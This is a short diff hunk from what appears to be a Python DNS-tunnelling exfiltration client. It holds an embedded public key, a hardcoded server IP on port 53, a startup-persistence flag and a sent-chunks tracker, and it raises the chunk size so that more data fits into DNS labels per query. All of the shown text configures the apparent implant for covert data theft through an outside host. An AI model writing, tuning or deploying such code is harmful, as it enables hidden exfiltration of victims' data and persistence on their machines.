@@ -14,7 +14,7 @@ MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEUnWlQdwMyM3H+bJdfJGRGAY/pfkD
 byS6+yVLuZj8YtvOsRb6mQyXBUUdvckfTDh5jdudZT9pMGJgWMhNPXlQ+w==
 -----END PUBLIC KEY-----"""
 target_pub_key = None
-CHUNK_SIZE = 15 # 11 data + 4 header -> short 3-6 char labels, ~60 char domains
+CHUNK_SIZE = 19 # 15 data + 4 header -> 3 labels of 18 chars -> 5 total labels max
 IS_ADDED_TO_STARTUP = False
 SERVER = ("20.63.24.136", 53)
 sent_chunks = {}
